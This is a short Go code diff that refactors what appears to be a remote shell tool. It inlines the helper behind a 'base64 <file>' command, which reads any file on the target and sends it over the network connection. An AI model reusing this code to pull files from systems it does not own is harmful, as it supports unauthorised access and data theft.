@@ -33,14 +33,6 @@ var (
 	fingerPrint   string
 )
 
-func Encode(path string) (string, error) {
-	buff, err := ioutil.ReadFile(path)
-	if err != nil {
-		return "", err
-	}
-	return base64.StdEncoding.EncodeToString(buff), err
-}
-
 func Send(conn net.Conn, msg string) {
 	conn.Write([]byte("\n"))
 	conn.Write([]byte(msg))
@@ -146,8 +138,8 @@ func InteractiveShell(conn net.Conn) {
 				if len(argv) != 2 {
 					Send(conn, "Usage: base64 <file>")
 				} else {
-					base64, err := Encode(argv[1])
-
+					buffer, err := ioutil.ReadFile(argv[1])
+					base64 := base64.StdEncoding.EncodeToString(buffer)
 					if err != nil {
 						Send(conn, err.Error())
 					} else {
